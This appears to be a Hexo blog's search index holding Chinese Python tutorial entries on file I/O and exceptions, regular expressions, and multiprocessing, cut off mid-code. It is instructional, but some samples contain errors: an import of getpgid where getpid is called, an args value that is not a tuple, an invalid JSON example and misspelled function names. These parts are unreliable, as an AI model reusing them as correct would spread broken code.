<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>11.文件和异常</title>
    <url>/2020/02/12/11-%E6%96%87%E4%BB%B6%E5%92%8C%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<h2 id="11-文件和异常"><a href="#11-文件和异常" class="headerlink" title="11.文件和异常"></a><strong>11.文件和异常</strong></h2><p>在Python中实现文件的读写操作通过内置的open函数，我们可以指定文件名、操作模式、编码信息等来获得操作文件的对象，接下来就可以对文件进行读写操作了。</p>
<span id="more"></span>
<p>读写函数：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>操作模式</th>
<th>具体含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>‘r’</td>
<td>读取（默认）</td>
</tr>
<tr>
<td>‘w’</td>
<td>写入（会先截断之前的内容）</td>
</tr>
<tr>
<td>‘x’</td>
<td>写入，如果文件已经存在会发生异常</td>
</tr>
<tr>
<td>‘a’</td>
<td>追加，讲内容写入到已有文件的末尾</td>
</tr>
<tr>
<td>‘b’</td>
<td>二进制模式</td>
</tr>
<tr>
<td>‘t’</td>
<td>文本模式（默认）</td>
</tr>
<tr>
<td>‘+’</td>
<td>更新（既可以读又可以写）</td>
</tr>
</tbody>
</table>
</div>
<h2 id="读写文本文件"><a href="#读写文本文件" class="headerlink" title="读写文本文件"></a>读写文本文件</h2><p>读取文本文件时，需要在使用open函数时指定好带路径的文件名（可以使用相对路径或绝对路径）并将文件模式设置为‘r’（如果不指定，默认值也是’r’），然后通过encoding参数指定编码（如果不指定，默认值为None，那么在读取文件时使用的是操作系统默认的编码），如果不能保证保存文件时使用的编码方式与encoding参数指定的编码方式是一致的，那么就可能因无法解码字符而导致读取失败。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    f = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;致橡树.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(f.read())</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;无法打开指定的文件！&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> LookupError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;指定了未知的编码！&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;读取文件时解码错误！&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            f.close()</span><br><span class="line"></span><br><span class="line">可以用<span class="keyword">with</span>代替<span class="keyword">finally</span></span><br><span class="line"><span class="comment"># def main():</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         with open(&#x27;致橡树.txt&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line"><span class="comment">#             print(f.read())</span></span><br><span class="line"><span class="comment">#     except FileNotFoundError:</span></span><br><span class="line"><span class="comment">#         print(&#x27;无法打开指定的文件！&#x27;)</span></span><br><span class="line"><span class="comment">#     except LookupError:</span></span><br><span class="line"><span class="comment">#         print(&#x27;指定了未知的编码！&#x27;)</span></span><br><span class="line"><span class="comment">#     except UnicodeDecodeError:</span></span><br><span class="line"><span class="comment">#         print(&#x27;读取文件时解码错误！&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><br>通过for-in循环逐行读取或者用readline方法将文件按行读取到一个列表容器：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="comment"># 一次性读取整个文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;致橡树.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        print(f.<span class="built_in">read</span>())</span><br><span class="line">    <span class="comment"># 通过for-in循环逐行读取</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;致橡树.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> f:</span><br><span class="line">            print(<span class="built_in">line</span>,<span class="keyword">end</span>=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">time</span>.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print()</span><br><span class="line">    <span class="comment"># 读取文件按行读取到列表中</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;致橡树.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">lines</span> = f.readlines()</span><br><span class="line">    print(<span class="keyword">lines</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><br>文本信息写入文件文件使用open函数,指定好文件名并将文件模式设置’w’即可。如果需要对文件内容进行追加式写入，应该将模式设置为’a’。如果要写入的文件不存在会自动创建文件而不是引发异常。下面的例子演示了如何将1-9999之间的素数分别写入三个文件中（1-99之间的素数保存在a.txt中，100-999之间的素数保存在b.txt中，1000-9999之间的素数保存在c.txt中）。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断素数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> n &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % factor == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> n != <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    filenames = (<span class="string">&#x27;a.txt&#x27;</span>,<span class="string">&#x27;b.txt&#x27;</span>,<span class="string">&#x27;c.txt&#x27;</span>)</span><br><span class="line">    fs_list = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">            fs_list.append(<span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">            <span class="keyword">if</span> is_prime(number):</span><br><span class="line">                <span class="keyword">if</span> number &lt; <span class="number">100</span>:</span><br><span class="line">                    fs_list[<span class="number">0</span>].write(<span class="built_in">str</span>(number)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> number &lt; <span class="number">1000</span>:</span><br><span class="line">                    fs_list[<span class="number">1</span>].write(<span class="built_in">str</span>(number) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fs_list[<span class="number">2</span>].write(<span class="built_in">str</span>(number) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;写文件时发生错误！&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">for</span> fs <span class="keyword">in</span> fs_list:</span><br><span class="line">            fs.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;操作完成！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<h2 id="读写二进制文件"><a href="#读写二进制文件" class="headerlink" title="读写二进制文件"></a>读写二进制文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">复制图片文件功能</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;guido.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fs1:</span><br><span class="line">            data = fs1.read()</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">type</span>(data)) <span class="comment">#&lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;优秀.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fs2:</span><br><span class="line">            fs2.write(data)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;指定的文件无法打开.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;读写文件时出现错误.&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;程序执行结束.&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="读写JSON-JavaScript-Object-Notation-文件"><a href="#读写JSON-JavaScript-Object-Notation-文件" class="headerlink" title="读写JSON(JavaScript Object Notation)文件"></a>读写JSON(JavaScript Object Notation)文件</h2><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: ’张三‘，</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">35</span>,</span><br><span class="line">    <span class="string">&quot;qq&quot;</span>: <span class="number">957658</span>,</span><br><span class="line">    <span class="string">&quot;friends&quot;</span>: [<span class="string">&#x27;王大锤&#x27;</span>,<span class="string">&#x27;白元芳&#x27;</span>],</span><br><span class="line">    <span class="string">&quot;cars&quot;</span>: [</span><br><span class="line">        &#123;<span class="string">&quot;brand&quot;</span>: <span class="string">&#x27;BYD&#x27;</span>, <span class="string">&#x27;max_speed&#x27;</span>:<span class="number">180</span>&#125;</span><br><span class="line">        &#123;<span class="string">&quot;brand&quot;</span>: <span class="string">&#x27;Audi&#x27;</span>,<span class="string">&#x27;max_speed&#x27;</span>:<span class="number">280</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;brand&quot;</span>: <span class="string">&#x27;Benz&#x27;</span>,<span class="string">&#x27;max_speed&#x27;</span>:<span class="number">320</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JSON跟Python中字典其实是一样一样的，事实上JSON的数据类型和Python的数据类型是很容易找到对用关系的</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>JSON</th>
<th>Python</th>
</tr>
</thead>
<tbody>
<tr>
<td>object</td>
<td>dict</td>
</tr>
<tr>
<td>array</td>
<td>list</td>
</tr>
<tr>
<td>string</td>
<td>str</td>
</tr>
<tr>
<td>number(int/real)</td>
<td>int/float</td>
</tr>
<tr>
<td>true/false</td>
<td>True/False</td>
</tr>
<tr>
<td>null</td>
<td>None</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>Python</th>
<th>JSON</th>
</tr>
</thead>
<tbody>
<tr>
<td>dict</td>
<td>object</td>
</tr>
<tr>
<td>list,tuple</td>
<td>array</td>
</tr>
<tr>
<td>str</td>
<td>string</td>
</tr>
<tr>
<td>int,float,int-&amp;float-derived Enums</td>
<td>number</td>
</tr>
<tr>
<td>True/Flase</td>
<td>true/false</td>
</tr>
<tr>
<td>None</td>
<td>null</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <tags>
        <tag>Python-100days</tag>
      </tags>
  </entry>
  <entry>
    <title>12.字符串和正则表达式</title>
    <url>/2020/02/13/12-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><a href="https://deerchao.cn/tutorials/regex/regex.htm">正则表达式30分钟入门</a><br><span id="more"></span><br>|符号|解释|事例|说明|<br>|—-|——|—-|——|<br>|.|匹配任意字符|b.t|可以匹配bat/but/b#t/b1t等|<br>|\w|匹配字母/数字/下划线|b\wt|可以匹配bat/b1t/b_t等，但不能匹配b#t|<br>|\s|匹配空白字符（包括\r、\n、\t等）|love\syou|可以匹配love you|<br>|\d|匹配数字|\d\d|可以匹配01/23/99等|<br>|^|匹配字符串的开始|^The|可以匹配The开头的字符串|<br>|$|匹配字符串的结束|.exe$|可以匹配.exe结尾的字符串|<br>|\W|匹配非字母/数字/下划线|b\Wt|可以匹配b#t/b@t等 但不能匹配but/b1t/b_t等|<br>|\S|匹配非空白字符|love\Syou|可以匹配Love#you等 但不能匹配love you等|<br>|\D|匹配非数字|\d\D|可以匹配9a/3#/0Fd等|<br>|\B|匹配非单词边界|\Bio\B||<br>|[]| 匹配来自字符集的任意单一字符 | [aeoou]|可以匹配任一原因字母字符|<br>|<sup><a href="#fn_" id="reffn_"></a></sup>|匹配不在字符集中的任意单一字符|<sup><a href="#fn_aeiou" id="reffn_aeiou">aeiou</a></sup>|可以匹配任一非元音字母字符|<br>|<em> | 匹配0次或多次|\W</em>||<br>|+|匹配1次或多次|\W+||<br>|?|匹配0次或1次|\W?||<br>|{N}|匹配N次|\w{3}|<br>|{M,}|匹配至少M次|\w{3,}||<br>|{M,N}|匹配至少M次至多N次|\w{3,6}||<br>| | |分支|foo | bar|可以匹配foo或者bar|<br>|(?#)|注释|||<br>|(exp)|匹配exp并捕获到自动命名的组中|||<br>|(?\<name\>exp)|匹配exp并捕获到名为name的组中|||<br>|(?:exp)|匹配exp但是不捕获匹配的文本|||<br>|(?=exp)|匹配exp前面的位置|\b\w(?=ing)|可以匹配I’m dancing中的danc|<br>|(?&lt;=exp)|匹配exp后面的位置|(?&lt;=\bdanc)\w+\b|可以匹配I love dancing and reading中的第一个ing|<br>|(?!exp)|匹配后面不是exp的位置|||<br>|(?&lt;!exp)|匹配前面不是exp的位置|||<br>|<em>?|重复任意次，但尽可能少重复|a.</em>b a.*?b|将正则表达式应用与aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串|<br>|+?|重复1次或多次，但尽可能少重复|||<br>|??|重复0次或1次，但尽可能少重复|||<br>|{M,N}?|重复M到N次，但尽可能少重复|||<br>|{M,}?|重复M次以上，但尽可能少重复|||</name\></p>
<blockquote>
<p>说明：如果需要匹配的字符是正则表达式中的特殊字符，那么可以使用\进行转义处理，例如想匹配小数点可以写成.就可以了，因为直接写.会匹配任意字符；同理，想匹配圆括号必须写成(和)，否则圆括号被视为正则表达式中的分组。</p>
</blockquote>
<h2 id="Python对正则表达式的支持"><a href="#Python对正则表达式的支持" class="headerlink" title="Python对正则表达式的支持"></a>Python对正则表达式的支持</h2><p>Python提供了re模块来支持正则表达式相关操作，下面时re模块中的核心函数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>conpile(pattern,flags=0)</td>
<td>编译正则表达式返回正则表达式对象</td>
</tr>
<tr>
<td>match(pattern,string,flags=0)</td>
<td>用正则表达式匹配字符串 成功返回匹配对象 否则返回None</td>
</tr>
<tr>
<td>search(pattern,string,flags=0)</td>
<td>搜索字符串中第一次出现正则表达式的模块 成功返回匹配对象 否则返回None</td>
</tr>
<tr>
<td>split(pattern,string,maxsplit=0,flags=0)</td>
<td>用正则表达式指定的模块分隔符拆分字符串 返回列表</td>
</tr>
<tr>
<td>sub(pattern,repl,string,count=0,flags=0)</td>
<td>用指定的字符串替换元字符串中与正则表达式匹配的模式 可以用count指定替换的次数</td>
</tr>
<tr>
<td>fullmatch(pattern,string,flags=0)</td>
<td>match函数的完全匹配（从字符串开始到结尾）版本</td>
</tr>
<tr>
<td>findall(pattern,string,flags=0)</td>
<td>查找字符串所有与正则表达式匹配的模式 返回字符串的列表</td>
</tr>
<tr>
<td>finditer(pattern,string,flags=0)</td>
<td>查找字符串所有与正则表达式匹配的模式 返回一个迭代器</td>
</tr>
<tr>
<td>purge()</td>
<td>清除隐式编译的正则表达式的缓存</td>
</tr>
<tr>
<td>re.l/re.IGNORECASE</td>
<td>忽略大小写匹配标记</td>
</tr>
<tr>
<td>re.M/re.MULTILINE</td>
<td>多行匹配标记</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>说明： 上面提到的re模块中的这些函数，实际开发中也可以用正则表达式对象的方法替代对这些函数的使用，如果一个正则表达式需要重复的使用，那么先通过compile函数编译正则表达式并创建出正则表达式对象无疑是更为明智的选择。</p>
</blockquote>
<h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><p>验证输入用户名和qq号是否有效并给出对应的提示信息<br>要求：用户名必须由字母、数字或下划线构成且长度在6-20个字符之间，qq号是5-12的数字且首位不能为0<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">    qq = <span class="built_in">input</span>(<span class="string">&#x27;请输入qq号：&#x27;</span>)</span><br><span class="line">    <span class="comment"># match函数的第一个参数是正则表达式字符串或正则表达式对象</span></span><br><span class="line">    <span class="comment"># 第二个参数是要跟正则表达式做匹配的字符串对象</span></span><br><span class="line">    m1 = re.match(<span class="string">r&#x27;^[0-9a-z-A-Z_]&#123;6,20&#125;$&#x27;</span>,username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请输入有效的用户名.&#x27;</span>)</span><br><span class="line">    m2 = re.match(<span class="string">r&#x27;^[1-9]\d&#123;4,11&#125;$&#x27;</span>,qq)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请输入有效的QQ号.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> m1 <span class="keyword">and</span> m2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;你输入的信息是有效的！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>提示： 上面在书写正则表达式时使用了“原始字符串”的写法（在字符串前面加上了r），<br>所谓“原始字符串”就是字符串中的每个字符都是它原始的意义，说得更直接一点就是字符串中没有所谓的转义字符啦。<br>因为正则表达式中有很多元字符和需要进行转义的地方，如果不使用原始字符串就需要将反斜杠写作\\，<br>例如表示数字的\d得书写成\\d，这样不仅写起来不方便，阅读的时候也会很吃力。</p>
</blockquote>
<h3 id="例2：从一段文字中提取出国内手机号码"><a href="#例2：从一段文字中提取出国内手机号码" class="headerlink" title="例2：从一段文字中提取出国内手机号码"></a>例2：从一段文字中提取出国内手机号码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建正则表达式对象 使用了前瞻和回顾来保证手机号前后不应该出现数字</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=\D)1[34578]\d&#123;9&#125;(?=\D)&#x27;</span>)</span><br><span class="line">    sentence = <span class="string">&#x27;重要的事情说8130123456789遍，我的手机号是13512346789这个靓号，不是15600998765，也是110或119，王大锤的手机号才是15600998765。&#x27;</span></span><br><span class="line">    <span class="comment"># 查找所有匹配并保存到一个列表中</span></span><br><span class="line">    mylist = re.findall(pattern,sentence)</span><br><span class="line">    <span class="built_in">print</span>(mylist)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------华丽的分割线--------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 通过迭代器取出匹配对象并获得匹配的内容</span></span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> pattern.finditer(sentence):</span><br><span class="line">        <span class="built_in">print</span>(temp.group())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------华丽的分割线--------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 通过search函数指定搜索位置找出所有的匹配</span></span><br><span class="line">    m = pattern.search(sentence)</span><br><span class="line">    <span class="keyword">while</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m.group())</span><br><span class="line">        m = pattern.search(sentence,m.end())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="例3-替换字符串中的不良内容"><a href="#例3-替换字符串中的不良内容" class="headerlink" title="例3 替换字符串中的不良内容"></a>例3 替换字符串中的不良内容</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def <span class="selector-tag">main</span>():</span><br><span class="line">    sentence = <span class="string">&#x27;你丫是傻叉吗？我操你大爷的.Fuck you.&#x27;</span></span><br><span class="line">    purified = re.<span class="built_in">sub</span>(<span class="string">&#x27;[操肏艹]|fuck|shit|傻[比屄逼叉缺吊屌]|煞笔&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,sentence,flags=re.IGNORECASE)</span><br><span class="line">    <span class="built_in">print</span>(purified)</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="例4：拆分长字符串"><a href="#例4：拆分长字符串" class="headerlink" title="例4：拆分长字符串"></a>例4：拆分长字符串</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    poem = <span class="string">&#x27;窗前明月光，疑是地上霜。举头望明月，低头思故乡。&#x27;</span></span><br><span class="line">    sentence_list = re.split(<span class="string">r&#x27;[,。，.]&#x27;</span>,poem)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> sentence_list:</span><br><span class="line">        sentence_list.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sentence_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Python-100days</tag>
      </tags>
  </entry>
  <entry>
    <title>13.进程和线程</title>
    <url>/2020/02/18/13.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>进程就是操作系统中执行的一个程序，操作系统以进程为单位分配存储空间，每个进程都有自己的地址空间、数据栈以及其他用于跟踪进程执行的辅助数据，操作系统管理所有进程的执行，为它们合理的分配资源。进程可以通过fork或spawn的方式来创建新的进程来执行其他的任务，不过新的进程也有自己独立的内存空间，因此必须通过进程间通信机制（IPC，Inter-Process Communication）来实现数据共享，具体的方式包括管道、信号、套接字、共享内存区等。<br>一个进程还可以拥有多个并发的执行线索，简单的说就是拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。由于线程在同一个进程下，它们可以共享相同的上下文，因此对于进程而言，线程间的信息共享和通信更加容易。当然在单核DDPU系统中，真正的并发是不可能的，因为<strong>在某个时刻能够获得CPU的只有唯一的一个线程，多个线程共享了CPU的执行时间</strong>。使用多线程实现并发编程为程序带来的好处是不言而喻的，最主要的体现是提升程序的性能和改善用户体验。<br><span id="more"></span></p>
<h2 id="Python中的多进程"><a href="#Python中的多进程" class="headerlink" title="Python中的多进程"></a>Python中的多进程</h2><p>Unix和Linux操作系统上提供了fork()系统调用来创建进程，调用fork()函数的是父进程，创建出的是子进程，子进程是父进程的一个拷贝，但是子进程拥有自己的PID。fork()函数非常特殊，它会返回两次，父进程中可以通过fork()函数的返回值得到子进程的PID，而子进程中的返回值永远都是0.Python的OS模块提供了fork()函数。由于Windows系统没有fork()调用，因此要实现跨平台的多进程编程，可以使用multiprocessing模块的Process类来创建子进程，而且该模块还提供了更高级的封装，例如批量启动进程的进程池（Pool）、用于进程间通信的队列（Queue）和管道（Pipe）等。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download_task(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费了%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">download_task</span>(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>)</span><br><span class="line">    <span class="built_in">download_task</span>(<span class="string">&#x27;Peking Hot.avi&#x27;</span>)</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.2f秒.&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>这个例子可以得出，如果程序中的代码只能按顺序一点点的往下执行，那么即使执行两个互不相关的下载任务，也需要先等待一个文件下载完成后才能开始下一个下载任务。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> multiprocessing import Process</span><br><span class="line"><span class="selector-tag">from</span> os import getpgid</span><br><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download_task(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;启动下载进程，进程号[%d].&#x27;</span> % <span class="built_in">getpid</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费了%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    p1 = <span class="built_in">Process</span>(target=download_task,args=(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>))</span><br><span class="line">    p1.<span class="built_in">start</span>()</span><br><span class="line">    p2 = <span class="built_in">Process</span>(target=download_task,args=(<span class="string">&#x27;Peking Hot.avi&#x27;</span>))</span><br><span class="line">    p2.<span class="built_in">start</span>()</span><br><span class="line">    p1.<span class="built_in">join</span>()</span><br><span class="line">    p2.<span class="built_in">join</span>()</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.2f秒.&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span 